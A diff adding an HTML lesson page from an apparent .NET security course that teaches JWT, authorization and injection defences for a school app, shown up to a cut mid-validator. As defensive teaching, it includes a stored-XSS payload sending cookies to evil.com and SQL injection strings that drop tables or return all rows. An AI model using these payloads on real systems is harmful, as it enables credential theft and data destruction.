@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 18 – Security | ZenCampus</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',sans-serif;background:#0d0d1a;color:#e0e0e0;line-height:1.75}
+header{background:linear-gradient(135deg,#120020,#0d0d1a,#120020);padding:36px 20px;text-align:center;border-bottom:3px solid #8b5cf6}
+header h1{font-size:2em;color:#a78bfa;text-shadow:0 0 20px #8b5cf655}
+header p{color:#c4b5fd;margin-top:6px}
+.badge{display:inline-block;background:#8b5cf622;border:1px solid #8b5cf655;color:#a78bfa;padding:3px 12px;border-radius:20px;font-size:0.78em;margin:3px}
+.container{max-width:1100px;margin:0 auto;padding:24px 16px}
+.section{background:#13132a;border-radius:12px;padding:22px;margin:22px 0;border:1px solid #1e1e3a}
+.section-title{font-size:1.15em;font-weight:bold;color:#a78bfa;margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.section-title .num{background:#8b5cf6;color:#fff;width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.8em;font-weight:bold;flex-shrink:0}
+pre{background:#0a0a1a;border:1px solid #1e1e3a;border-radius:8px;padding:16px;overflow-x:auto;font-family:'Consolas',monospace;font-size:0.84em;line-height:1.65;margin:10px 0}
+.kw{color:#569cd6}.tp{color:#4ec9b0}.st{color:#ce9178}.nm{color:#b5cea8}.cm{color:#6a9955}.pr{color:#9cdcfe}.mt{color:#dcdcaa}.at{color:#c586c0}
+code{background:#1a1a2e;color:#8b5cf6;padding:2px 7px;border-radius:4px;font-family:'Consolas',monospace;font-size:0.85em}
+.movie{background:#0d0020;border-left:4px solid #8b5cf6;border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0}
+.movie .film{color:#f39c12;font-weight:bold;font-size:0.85em}
+.movie p{color:#c4b5fd;font-size:0.9em;margin-top:4px}
+.tip{background:#001500;border-left:4px solid #22c55e;border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0}
+.tip .t-label{color:#22c55e;font-weight:bold;font-size:0.8em;margin-bottom:4px}
+.tip p{color:#bbf7d0;font-size:0.9em}
+.danger{background:#1f0a0a;border-left:4px solid #e74c3c;border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0}
+.danger .d-label{color:#e74c3c;font-weight:bold;font-size:0.8em;margin-bottom:4px}
+.danger p{color:#f1948a;font-size:0.9em}
+.comparison{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0}
+@media(max-width:700px){.comparison,.two-col{grid-template-columns:1fr}}
+.bad-box{background:#1f0a0a;border:1px solid #e74c3c44;border-radius:8px;padding:14px}
+.good-box{background:#0a1f0a;border:1px solid #2ecc7144;border-radius:8px;padding:14px}
+.box-label{font-size:0.78em;font-weight:bold;margin-bottom:8px}
+.bad-box .box-label{color:#e74c3c}.good-box .box-label{color:#2ecc71}
+table{width:100%;border-collapse:collapse;margin:14px 0;font-size:0.87em}
+th{background:#0d0020;color:#a78bfa;padding:10px 12px;text-align:left}
+td{padding:9px 12px;border-bottom:1px solid #1e1e3a;color:#c0c0d0}
+tr:hover td{background:#0a0a2a}
+.green{color:#2ecc71}.red{color:#e74c3c}.yellow{color:#f39c12}.violet{color:#a78bfa}
+.scenario-card{background:#0f0f20;border:1px solid #2a2a5a;border-radius:10px;padding:20px;margin:16px 0}
+.scenario-card.hot{border-color:#8b5cf655;background:#0d0020}
+.scenario-header{display:flex;align-items:center;gap:12px;margin-bottom:12px;flex-wrap:wrap}
+.s-num{background:#8b5cf6;color:#fff;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:0.85em;flex-shrink:0}
+.s-num.crit{background:#e74c3c}
+.scenario-title{font-weight:bold;color:#fff;font-size:1em}
+.diff{font-size:0.72em;padding:2px 8px;border-radius:4px;font-weight:bold}
+.easy{background:#1a4a1a;color:#2ecc71}.medium{background:#4a3a0a;color:#f39c12}.hard{background:#4a0a0a;color:#e74c3c}.senior{background:#0d0020;color:#a78bfa}
+.real{background:#0d0020;color:#a78bfa;font-size:0.72em;padding:2px 8px;border-radius:4px;font-weight:bold;border:1px solid #8b5cf655}
+.hot-badge{background:#1f0a0a;color:#e74c3c;font-size:0.72em;padding:2px 8px;border-radius:4px;font-weight:bold;border:1px solid #e74c3c55}
+.scenario-q{color:#c0c8e0;font-size:0.93em;background:#1a1a2e;padding:12px 14px;border-radius:6px;margin:8px 0;line-height:1.7}
+.reveal-btn{background:#0d0020;border:1px solid #8b5cf6;color:#a78bfa;padding:7px 16px;border-radius:6px;cursor:pointer;font-size:0.85em;margin-top:10px;transition:background 0.2s}
+.reveal-btn:hover{background:#8b5cf6;color:#fff}
+.answer{display:none;background:#0a0a1f;border-radius:6px;padding:14px;margin-top:10px;border:1px solid #1e1e3a}
+.answer.shown{display:block}
+.answer .a-label{color:#a78bfa;font-size:0.8em;font-weight:bold;margin-bottom:8px}
+.answer .a-label.crit{color:#e74c3c}
+.gold-box{background:#1a1000;border:1px solid #f39c12;border-radius:6px;padding:10px 14px;margin-top:8px;color:#f0dc82;font-size:0.85em}
+.gold-label{color:#f39c12;font-weight:bold;font-size:0.78em}
+.quiz-opt{background:#1a1a35;border:1px solid #2a2a5a;border-radius:6px;padding:10px 14px;margin:6px 0;cursor:pointer;font-size:0.9em;transition:all 0.2s}
+.quiz-opt:hover{border-color:#8b5cf6;color:#a78bfa}
+.quiz-opt.correct{background:#0a2a0a;border-color:#2ecc71;color:#2ecc71}
+.quiz-opt.wrong{background:#2a0a0a;border-color:#e74c3c;color:#e74c3c}
+.quiz-fb{display:none;margin-top:8px;font-size:0.85em;padding:8px 12px;border-radius:6px}
+.quiz-fb.shown{display:block}
+.quiz-fb.ok{background:#0a2a0a;color:#2ecc71;border-left:3px solid #2ecc71}
+.quiz-fb.nope{background:#2a0a0a;color:#f1948a;border-left:3px solid #e74c3c}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.check-list{list-style:none;margin:10px 0}
+.check-list li{padding:5px 0;font-size:0.9em;color:#c0c0d0}
+.check-list li::before{content:"☐ ";color:#8b5cf6}
+.sticky-nav{background:#0d0d1a;border-bottom:1px solid #1e1e3a;padding:10px 20px;position:sticky;top:0;z-index:100;display:flex;gap:10px;flex-wrap:wrap}
+.sticky-nav a{color:#a78bfa;text-decoration:none;font-size:0.82em;padding:4px 10px;border-radius:4px;border:1px solid #1e1e3a}
+.sticky-nav a:hover{background:#0d0020}
+.progress-wrap{background:#1a1a2e;border-radius:20px;height:8px;margin:6px 0}
+.progress-fill{border-radius:20px;height:8px;background:linear-gradient(90deg,#8b5cf6,#a78bfa)}
+footer{text-align:center;padding:28px;color:#444;border-top:1px solid #1e1e3a;margin-top:40px}
+p{margin:6px 0}
+h3{color:#c4b5fd;margin:16px 0 8px;font-size:1em}
+.owasp-item{background:#0a0520;border:1px solid #2a1a4a;border-radius:8px;padding:12px 14px;margin:8px 0}
+.owasp-id{color:#8b5cf6;font-weight:bold;font-size:0.8em}
+.owasp-name{color:#fff;font-weight:bold;font-size:0.95em;margin:2px 0}
+.owasp-zen{color:#c4b5fd;font-size:0.85em}
+.token-box{background:#0a0a1a;border:1px solid #2a2a4a;border-radius:8px;padding:14px;margin:10px 0;font-family:'Consolas',monospace;font-size:0.82em}
+.tok-part{margin:4px 0}
+.tok-h{color:#fb923c}.tok-p{color:#60b4ff}.tok-s{color:#2ecc71}
+</style>
+</head>
+<body>
+
+<header>
+  <div style="color:#a78bfa;font-size:0.85em;margin-bottom:6px">📅 Day 18 of 60 | Phase 1: Core .NET Mastery</div>
+  <h1>🔒 Security — JWT · OWASP · Authorization · Rate Limiting</h1>
+  <p>SQL Injection · XSS · CSRF · Broken Access Control · Refresh Tokens · Security Headers</p>
+  <div style="margin-top:12px">
+    <span class="badge">JWT + Refresh Token</span><span class="badge">Role-Based Auth</span><span class="badge">Policy Auth</span>
+    <span class="badge">SQL Injection</span><span class="badge">XSS Prevention</span><span class="badge">CSRF</span>
+    <span class="badge">Rate Limiting</span><span class="badge">OWASP Top 10</span><span class="badge">Security Headers</span>
+  </div>
+</header>
+
+<nav class="sticky-nav">
+  <a href="#owasp">🛡️ OWASP</a>
+  <a href="#jwt">🎟️ JWT</a>
+  <a href="#authz">🔑 Authorization</a>
+  <a href="#injection">💉 Injection</a>
+  <a href="#xss">📜 XSS/CSRF</a>
+  <a href="#ratelimit">⏱️ Rate Limit</a>
+  <a href="#scenarios">🎯 Scenarios</a>
+  <a href="#quiz">🧠 Quiz</a>
+</nav>
+
+<div class="container">
+
+<!-- SECTION 1: OWASP -->
+<div class="section" id="owasp">
+  <div class="section-title"><span class="num">1</span> OWASP Top 10 — ZenCampus Attack Surface</div>
+
+  <div class="movie">
+    <span class="film">🎬 Sarkar — election rigging through system manipulation. OWASP Top 10 = the 10 ways attackers rig ZenCampus. Know the attacks to defend against them. A parent who hacks fee records = Sarkar villain!</span>
+    <p>ZenCampus stores: 50,000 student records, fee payments, parent contacts, biometric attendance. Attack surface is real. SQL injection can expose all student data. XSS can steal admin JWT tokens. Broken access control lets parent A see parent B's child. OWASP = your defense checklist.</p>
+  </div>
+
+  <div class="owasp-item">
+    <div class="owasp-id">A01:2021</div>
+    <div class="owasp-name">Broken Access Control <span class="red">← #1 most common</span></div>
+    <div class="owasp-zen">ZenCampus risk: Parent accesses GET /api/students/102 (not their child). Teacher modifies another school's records. Fix: resource-based authorization — verify ownership, not just role.</div>
+  </div>
+  <div class="owasp-item">
+    <div class="owasp-id">A02:2021</div>
+    <div class="owasp-name">Cryptographic Failures</div>
+    <div class="owasp-zen">ZenCampus risk: DB connection string in appsettings.json (Day 15!), MD5 password hashing, HTTP not HTTPS. Fix: Key Vault, BCrypt passwords, HSTS.</div>
+  </div>
+  <div class="owasp-item">
+    <div class="owasp-id">A03:2021</div>
+    <div class="owasp-name">Injection (SQL, NoSQL, OS)</div>
+    <div class="owasp-zen">ZenCampus risk: Student search by name — raw string SQL. Fee report by date — string concatenation. Fix: EF Core parameterized queries, Dapper @param.</div>
+  </div>
+  <div class="owasp-item">
+    <div class="owasp-id">A05:2021</div>
+    <div class="owasp-name">Security Misconfiguration</div>
+    <div class="owasp-zen">ZenCampus risk: Swagger UI exposed in production, debug endpoints active, CORS allows *, verbose error messages showing stack traces. Fix: environment-specific config.</div>
+  </div>
+  <div class="owasp-item">
+    <div class="owasp-id">A07:2021</div>
+    <div class="owasp-name">Identification & Authentication Failures</div>
+    <div class="owasp-zen">ZenCampus risk: No brute-force protection on login (admin password can be guessed), weak JWT secret, tokens never expire. Fix: rate limiting on login, strong secret, short expiry + refresh tokens.</div>
+  </div>
+  <div class="owasp-item">
+    <div class="owasp-id">A03 Sub</div>
+    <div class="owasp-name">XSS — Cross-Site Scripting</div>
+    <div class="owasp-zen">ZenCampus risk: Student name with &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt; stored in DB, displayed in admin dashboard → steals admin JWT from localStorage!</div>
+  </div>
+</div>
+
+<!-- SECTION 2: JWT -->
+<div class="section" id="jwt">
+  <div class="section-title"><span class="num">2</span> JWT — Authentication in ZenCampus</div>
+
+  <div class="movie">
+    <span class="film">🎬 Kaththi — Kathiresan has two identities: village hero + urban rebel. JWT = same. Header (who am I), Payload (what can I do), Signature (prove I'm real). School admin JWT: role=Admin, schoolId=42, exp=1hr.</span>
+  </div>
+
+  <div class="token-box">
+    <div class="tok-part"><span class="tok-h">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span> ← Header (Base64): {"alg":"HS256","typ":"JWT"}</div>
+    <div class="tok-part">.<span class="tok-p">eyJzdWIiOiIxMjMiLCJuYW1lIjoiQWRtaW4iLCJyb2xlIjoiQWRtaW4iLCJzY2hvb2xJZCI6IjQyIiwiZXhwIjoxNzUwMDAwMDAwfQ</span></div>
+    <div style="color:#c4b5fd;font-size:0.85em;margin-left:8px">↑ Payload (Base64): {"sub":"123","name":"Admin","role":"Admin","schoolId":"42","exp":1750000000}</div>
+    <div class="tok-part">.<span class="tok-s">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span> ← Signature: HMACSHA256(header+"."+payload, secret)</div>
+    <div style="color:#888;font-size:0.8em;margin-top:6px">⚠️ Payload is Base64 (NOT encrypted) — anyone can decode it. Never put passwords/sensitive data in JWT!</div>
+  </div>
+
+  <pre><span class="cm">// NuGet: Microsoft.AspNetCore.Authentication.JwtBearer, System.IdentityModel.Tokens.Jwt</span>
+
+<span class="cm">// Program.cs — JWT setup</span>
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddAuthentication</span>(<span class="tp">JwtBearerDefaults</span>.<span class="pr">AuthenticationScheme</span>)
+    .<span class="mt">AddJwtBearer</span>(<span class="pr">opts</span> =>
+    {
+        <span class="pr">opts</span>.<span class="pr">TokenValidationParameters</span> = <span class="kw">new</span> <span class="tp">TokenValidationParameters</span>
+        {
+            <span class="pr">ValidateIssuer</span>           = <span class="kw">true</span>,
+            <span class="pr">ValidIssuer</span>              = <span class="st">"https://zencampus.com"</span>,
+            <span class="pr">ValidateAudience</span>         = <span class="kw">true</span>,
+            <span class="pr">ValidAudience</span>            = <span class="st">"zencampus-api"</span>,
+            <span class="pr">ValidateIssuerSigningKey</span>  = <span class="kw">true</span>,
+            <span class="pr">IssuerSigningKey</span>         = <span class="kw">new</span> <span class="tp">SymmetricSecurityKey</span>(
+                <span class="tp">Encoding</span>.<span class="pr">UTF8</span>.<span class="mt">GetBytes</span>(<span class="pr">config</span>[<span class="st">"Jwt:Secret"</span>]!)),  <span class="cm">// from Key Vault!</span>
+            <span class="pr">ValidateLifetime</span>         = <span class="kw">true</span>,
+            <span class="pr">ClockSkew</span>                = <span class="tp">TimeSpan</span>.<span class="mt">FromMinutes</span>(<span class="nm">1</span>)  <span class="cm">// allow 1 min clock drift</span>
+        };
+    });
+
+<span class="pr">app</span>.<span class="mt">UseAuthentication</span>(); <span class="cm">// order matters! Authentication before Authorization</span>
+<span class="pr">app</span>.<span class="mt">UseAuthorization</span>();
+
+<span class="cm">// Token generation service</span>
+<span class="kw">public class</span> <span class="tp">JwtTokenService</span>(<span class="tp">IConfiguration</span> <span class="pr">config</span>)
+{
+    <span class="kw">public</span> <span class="tp">LoginResponse</span> <span class="mt">GenerateTokens</span>(<span class="tp">User</span> <span class="pr">user</span>)
+    {
+        <span class="kw">var</span> <span class="pr">claims</span> = <span class="kw">new</span>[]
+        {
+            <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">ClaimTypes</span>.<span class="pr">NameIdentifier</span>, <span class="pr">user</span>.<span class="pr">Id</span>.<span class="mt">ToString</span>()),
+            <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">ClaimTypes</span>.<span class="pr">Name</span>,             <span class="pr">user</span>.<span class="pr">Name</span>),
+            <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">ClaimTypes</span>.<span class="pr">Role</span>,             <span class="pr">user</span>.<span class="pr">Role</span>),     <span class="cm">// Admin/Teacher/Parent</span>
+            <span class="kw">new</span> <span class="tp">Claim</span>(<span class="st">"schoolId"</span>,                  <span class="pr">user</span>.<span class="pr">SchoolId</span>.<span class="mt">ToString</span>()),
+            <span class="kw">new</span> <span class="tp">Claim</span>(<span class="tp">JwtRegisteredClaimNames</span>.<span class="pr">Jti</span>,  <span class="tp">Guid</span>.<span class="mt">NewGuid</span>().<span class="mt">ToString</span>()), <span class="cm">// unique token ID</span>
+        };
+
+        <span class="kw">var</span> <span class="pr">key</span>   = <span class="kw">new</span> <span class="tp">SymmetricSecurityKey</span>(<span class="tp">Encoding</span>.<span class="pr">UTF8</span>.<span class="mt">GetBytes</span>(<span class="pr">config</span>[<span class="st">"Jwt:Secret"</span>]!));
+        <span class="kw">var</span> <span class="pr">creds</span> = <span class="kw">new</span> <span class="tp">SigningCredentials</span>(<span class="pr">key</span>, <span class="tp">SecurityAlgorithms</span>.<span class="pr">HmacSha256</span>);
+        <span class="kw">var</span> <span class="pr">token</span> = <span class="kw">new</span> <span class="tp">JwtSecurityToken</span>(
+            <span class="pr">issuer</span>:             <span class="st">"https://zencampus.com"</span>,
+            <span class="pr">audience</span>:           <span class="st">"zencampus-api"</span>,
+            <span class="pr">claims</span>:             <span class="pr">claims</span>,
+            <span class="pr">expires</span>:            <span class="tp">DateTime</span>.<span class="pr">UtcNow</span>.<span class="mt">AddHours</span>(<span class="nm">1</span>),  <span class="cm">// short-lived!</span>
+            <span class="pr">signingCredentials</span>: <span class="pr">creds</span>);
+
+        <span class="kw">return new</span> <span class="tp">LoginResponse</span>
+        {
+            <span class="pr">AccessToken</span>  = <span class="kw">new</span> <span class="tp">JwtSecurityTokenHandler</span>().<span class="mt">WriteToken</span>(<span class="pr">token</span>),
+            <span class="pr">RefreshToken</span> = <span class="mt">GenerateRefreshToken</span>(),  <span class="cm">// opaque, stored in DB</span>
+            <span class="pr">ExpiresAt</span>    = <span class="tp">DateTime</span>.<span class="pr">UtcNow</span>.<span class="mt">AddHours</span>(<span class="nm">1</span>)
+        };
+    }
+
+    <span class="kw">private static string</span> <span class="mt">GenerateRefreshToken</span>()
+    {
+        <span class="kw">var</span> <span class="pr">bytes</span> = <span class="tp">RandomNumberGenerator</span>.<span class="mt">GetBytes</span>(<span class="nm">64</span>);
+        <span class="kw">return</span> <span class="tp">Convert</span>.<span class="mt">ToBase64String</span>(<span class="pr">bytes</span>);  <span class="cm">// 64 crypto-random bytes → opaque token</span>
+    }
+}</pre>
+
+  <pre><span class="cm">// Refresh token flow — when access token expires (1hr), use refresh token (7 days)</span>
+[<span class="at">HttpPost</span>(<span class="st">"auth/refresh"</span>)]
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">RefreshAsync</span>([<span class="at">FromBody</span>] <span class="tp">RefreshRequest</span> <span class="pr">req</span>)
+{
+    <span class="kw">var</span> <span class="pr">stored</span> = <span class="kw">await</span> <span class="pr">_tokenRepo</span>.<span class="mt">GetRefreshTokenAsync</span>(<span class="pr">req</span>.<span class="pr">RefreshToken</span>);
+
+    <span class="kw">if</span> (<span class="pr">stored</span> <span class="kw">is null</span> || <span class="pr">stored</span>.<span class="pr">ExpiresAt</span> < <span class="tp">DateTime</span>.<span class="pr">UtcNow</span> || <span class="pr">stored</span>.<span class="pr">IsRevoked</span>)
+        <span class="kw">return</span> <span class="mt">Unauthorized</span>(<span class="st">"Invalid or expired refresh token"</span>);
+
+    <span class="cm">// Rotate refresh token — old one invalid, new one issued</span>
+    <span class="kw">await</span> <span class="pr">_tokenRepo</span>.<span class="mt">RevokeAsync</span>(<span class="pr">req</span>.<span class="pr">RefreshToken</span>);
+    <span class="kw">var</span> <span class="pr">user</span>     = <span class="kw">await</span> <span class="pr">_userRepo</span>.<span class="mt">GetAsync</span>(<span class="pr">stored</span>.<span class="pr">UserId</span>);
+    <span class="kw">var</span> <span class="pr">response</span> = <span class="pr">_jwtService</span>.<span class="mt">GenerateTokens</span>(<span class="pr">user</span>!);
+
+    <span class="kw">await</span> <span class="pr">_tokenRepo</span>.<span class="mt">SaveRefreshTokenAsync</span>(<span class="pr">user</span>!.<span class="pr">Id</span>, <span class="pr">response</span>.<span class="pr">RefreshToken</span>,
+        <span class="tp">DateTime</span>.<span class="pr">UtcNow</span>.<span class="mt">AddDays</span>(<span class="nm">7</span>));
+
+    <span class="kw">return</span> <span class="mt">Ok</span>(<span class="pr">response</span>);
+}
+<span class="cm">// Refresh token rotation: old refresh token revoked on each use.
+// If attacker steals refresh token and uses it → original user's next refresh fails → detects theft!</span></pre>
+</div>
+
+<!-- SECTION 3: AUTHORIZATION -->
+<div class="section" id="authz">
+  <div class="section-title"><span class="num">3</span> Authorization — Role · Policy · Resource-Based</div>
+
+  <pre><span class="cm">// Role-based authorization (simple)</span>
+[<span class="at">Authorize</span>(<span class="pr">Roles</span> = <span class="st">"Admin"</span>)]
+[<span class="at">HttpDelete</span>(<span class="st">"students/{id}"</span>)]
+<span class="kw">public</span> <span class="tp">IActionResult</span> <span class="mt">DeleteStudent</span>(<span class="kw">int</span> <span class="pr">id</span>) { }
+
+[<span class="at">Authorize</span>(<span class="pr">Roles</span> = <span class="st">"Admin,Teacher"</span>)]    <span class="cm">// multiple roles — OR logic</span>
+[<span class="at">HttpGet</span>(<span class="st">"attendance"</span>)]
+<span class="kw">public</span> <span class="tp">IActionResult</span> <span class="mt">GetAttendance</span>() { }
+
+<span class="cm">// Policy-based authorization (complex rules)</span>
+<span class="pr">builder</span>.<span class="pr">Services</span>.<span class="mt">AddAuthorization</span>(<span class="pr">opts</span> =>
+{
+    <span class="pr">opts</span>.<span class="mt">AddPolicy</span>(<span class="st">"SameSchool"</span>, <span class="pr">p</span> => <span class="pr">p</span>
+        .<span class="mt">RequireAuthenticatedUser</span>()
+        .<span class="mt">RequireClaim</span>(<span class="st">"schoolId"</span>)
+        .<span class="mt">AddRequirements</span>(<span class="kw">new</span> <span class="tp">SameSchoolRequirement</span>()));
+
+    <span class="pr">opts</span>.<span class="mt">AddPolicy</span>(<span class="st">"CanCollectFee"</span>, <span class="pr">p</span> => <span class="pr">p</span>
+        .<span class="mt">RequireRole</span>(<span class="st">"Admin"</span>, <span class="st">"Accountant"</span>)
+        .<span class="mt">RequireClaim</span>(<span class="st">"schoolId"</span>));   <span class="cm">// must have schoolId AND be Admin or Accountant</span>
+
+    <span class="pr">opts</span>.<span class="mt">AddPolicy</span>(<span class="st">"ParentOnly"</span>, <span class="pr">p</span> => <span class="pr">p</span>
+        .<span class="mt">RequireRole</span>(<span class="st">"Parent"</span>)
+        .<span class="mt">RequireClaim</span>(<span class="st">"studentIds"</span>));  <span class="cm">// parent must have linked studentIds</span>
+});
+
+<span class="cm">// Custom requirement + handler</span>
+<span class="kw">public class</span> <span class="tp">SameSchoolRequirement</span> : <span class="tp">IAuthorizationRequirement</span> { }
+
+<span class="kw">public class</span> <span class="tp">SameSchoolHandler</span> : <span class="tp">AuthorizationHandler</span>&lt;<span class="tp">SameSchoolRequirement</span>, <span class="tp">Student</span>&gt;
+{
+    <span class="kw">protected override</span> <span class="tp">Task</span> <span class="mt">HandleRequirementAsync</span>(
+        <span class="tp">AuthorizationHandlerContext</span> <span class="pr">ctx</span>,
+        <span class="tp">SameSchoolRequirement</span> <span class="pr">req</span>,
+        <span class="tp">Student</span> <span class="pr">resource</span>)  <span class="cm">// resource = the student being accessed</span>
+    {
+        <span class="kw">var</span> <span class="pr">userSchoolId</span> = <span class="kw">int</span>.<span class="mt">Parse</span>(<span class="pr">ctx</span>.<span class="pr">User</span>.<span class="mt">FindFirst</span>(<span class="st">"schoolId"</span>)!.<span class="pr">Value</span>);
+
+        <span class="kw">if</span> (<span class="pr">resource</span>.<span class="pr">SchoolId</span> == <span class="pr">userSchoolId</span>)
+            <span class="pr">ctx</span>.<span class="mt">Succeed</span>(<span class="pr">req</span>);           <span class="cm">// teacher can access this student</span>
+        <span class="cm">// else: implicit Fail — teacher from school 42 can't touch school 99's students!</span>
+
+        <span class="kw">return</span> <span class="tp">Task</span>.<span class="pr">CompletedTask</span>;
+    }
+}
+
+<span class="cm">// Resource-based authorization — check in controller action</span>
+[<span class="at">HttpGet</span>(<span class="st">"students/{id}"</span>)]
+[<span class="at">Authorize</span>(<span class="pr">Roles</span> = <span class="st">"Admin,Teacher,Parent"</span>)]
+<span class="kw">public async</span> <span class="tp">Task</span>&lt;<span class="tp">IActionResult</span>&gt; <span class="mt">GetStudent</span>(<span class="kw">int</span> <span class="pr">id</span>)
+{
+    <span class="kw">var</span> <span class="pr">student</span> = <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">GetAsync</span>(<span class="pr">id</span>);
+    <span class="kw">if</span> (<span class="pr">student</span> <span class="kw">is null</span>) <span class="kw">return</span> <span class="mt">NotFound</span>();
+
+    <span class="cm">// Resource-based: can THIS user access THIS specific student?</span>
+    <span class="kw">var</span> <span class="pr">authResult</span> = <span class="kw">await</span> <span class="pr">_authService</span>.<span class="mt">AuthorizeAsync</span>(<span class="tp">User</span>, <span class="pr">student</span>, <span class="st">"SameSchool"</span>);
+    <span class="kw">if</span> (!<span class="pr">authResult</span>.<span class="pr">Succeeded</span>) <span class="kw">return</span> <span class="mt">Forbid</span>(); <span class="cm">// 403 — authenticated but not authorized</span>
+
+    <span class="cm">// For Parent role: extra check — is this their child?</span>
+    <span class="kw">if</span> (<span class="tp">User</span>.<span class="mt">IsInRole</span>(<span class="st">"Parent"</span>))
+    {
+        <span class="kw">var</span> <span class="pr">parentId</span>  = <span class="kw">int</span>.<span class="mt">Parse</span>(<span class="tp">User</span>.<span class="mt">FindFirst</span>(<span class="tp">ClaimTypes</span>.<span class="pr">NameIdentifier</span>)!.<span class="pr">Value</span>);
+        <span class="kw">var</span> <span class="pr">isMyChild</span> = <span class="kw">await</span> <span class="pr">_repo</span>.<span class="mt">IsParentOfStudentAsync</span>(<span class="pr">parentId</span>, <span class="pr">id</span>);
+        <span class="kw">if</span> (!<span class="pr">isMyChild</span>) <span class="kw">return</span> <span class="mt">Forbid</span>(); <span class="cm">// Parent A cannot see Parent B's child!</span>
+    }
+
+    <span class="kw">return</span> <span class="mt">Ok</span>(<span class="pr">student</span>);
+}</pre>
+
+  <table>
+    <tr><th>Auth Type</th><th>ZenCampus Use</th><th>Mechanism</th></tr>
+    <tr><td class="violet">Role-based</td><td>Admin can delete, Teacher can view</td><td>[Authorize(Roles="Admin")]</td></tr>
+    <tr><td class="violet">Policy-based</td><td>CanCollectFee = Admin/Accountant + schoolId claim</td><td>AddPolicy + Requirements</td></tr>
+    <tr><td class="violet">Resource-based</td><td>Teacher can only access their school's students</td><td>IAuthorizationService.AuthorizeAsync(resource)</td></tr>
+    <tr><td class="violet">Claim-based</td><td>Parent can only see students in their studentIds claim</td><td>RequireClaim("studentIds")</td></tr>
+  </table>
+</div>
+
+<!-- SECTION 4: SQL INJECTION -->
+<div class="section" id="injection">
+  <div class="section-title"><span class="num">4</span> SQL Injection + Input Validation</div>
+
+  <div class="movie">
+    <span class="film">🎬 Sarkar — villain manipulates election results through the system. SQL Injection = same. Attacker inputs ' OR '1'='1 → manipulates your SQL → sees all students, drops tables, extracts passwords. Prevention: parameterized queries always!</span>
+  </div>
+
+  <div class="comparison">
+    <div class="bad-box">
+      <div class="box-label">❌ SQL Injection — VULNERABLE!</div>
+      <pre style="margin:0;font-size:0.8em"><span class="cm">// Student search — string concat!</span>
+<span class="kw">var</span> <span class="pr">sql</span> = <span class="st">$"SELECT * FROM Students
+  WHERE Name LIKE '%{name}%'"</span>;
+<span class="cm">// Attack: name = "'; DROP TABLE Students;--"
+// Generated: SELECT * FROM Students
+//   WHERE Name LIKE '%'; DROP TABLE Students;--%'
+// Result: table deleted!</span>
+
+<span class="cm">// Another attack:
+// name = "' OR '1'='1"
+// Returns ALL students!</span></pre>
+    </div>
+    <div class="good-box">
+      <div class="box-label">✅ Safe — Parameterized Query</div>
+      <pre style="margin:0;font-size:0.8em"><span class="cm">// EF Core — always parameterized</span>
+<span class="kw">var</span> <span class="pr">students</span> = <span class="kw">await</span> <span class="pr">_ctx</span>.<span class="pr">Students</span>
+    .<span class="mt">Where</span>(<span class="pr">s</span> => <span class="tp">EF</span>.<span class="mt">Functions</span>.<span class="mt">Like</span>(
+        <span class="pr">s</span>.<span class="pr">Name</span>, <span class="st">$"%{name}%"</span>))
+    .<span class="mt">ToListAsync</span>();
+<span class="cm">// SQL: WHERE Name LIKE @p0
+// @p0 = '%'+name+'%' (SAFE!)</span>
+
+<span class="cm">// Dapper — @param syntax</span>
+<span class="kw">await</span> <span class="pr">db</span>.<span class="mt">QueryAsync</span>(<span class="st">@"SELECT * FROM Students
+  WHERE Name LIKE @Name"</span>,
+    <span class="kw">new</span> { <span class="pr">Name</span> = <span class="st">$"%{name}%"</span> });</pre>
+    </div>
+  </div>
+
+  <pre><span class="cm">// FluentValidation — validate inputs at boundary</span>
+<span class="cm">// NuGet: FluentValidation.AspNetCore</span>
+
+<span class="kw">public class</span> <span class="tp">FeeCollectDtoValidator</span> : <span class="tp">AbstractValidator</span>&lt;<span class="tp">FeeCollectDto</span>&gt;
+{
+    <span class="kw">public</span> <span class="mt">FeeCollectDtoValidator</span>()
+    {
+        <span class="mt">RuleFor</span>(<span class="pr">x</span> => <span class="pr">x</span>.<span class="pr">StudentId</span>)
+            .<span class="mt">GreaterThan</span>(<span class="nm">0</span>).<span class="mt">WithMessage</span>(<span class="st">"StudentId must be positive"</span>);
+
+        <span class="mt">RuleFor</span>(<span class="pr">x</span> => <span class="pr">x</span>.<span class="pr">Amount</span>)
+            .<span class="mt">GreaterThan</span>(<span class="nm">0</span>).<span class="mt">WithMessage</span>(<span class="st">"Amount must be positive"</span>)
+            .<span class="mt">LessThanOrEqualTo</span>(<span class="nm">100000m</span>).<span class="mt">WithMessage</span>(<span class="st">"Amount exceeds maximum"</span>);
+
+        <span class="mt">RuleFor</span>(<span class="pr">x</span> => <span class="pr">x</span>.<span class="pr">ParentPhone</span>)
+            .<span class="mt">NotEmpty</span>()
+            .<span class="mt">Matches</span>(<span class="st">@"^\+?[1-9]\d{9,14}$"</span>).<span class="mt">WithMessage</span>(<span class="st">"Invalid phone number"</span>);
+
+        <span class="mt">RuleFor</span>(<span class="pr">x</span> => <span class="pr">x</span>.<span class="pr">StudentName</span>)   <span class="cm">// never render without sanitizing</span>
+            .<span class="mt">NotEmpty</span>()
+            .<span class="mt">MaximumLength</span>(<span class="nm">100</span>)
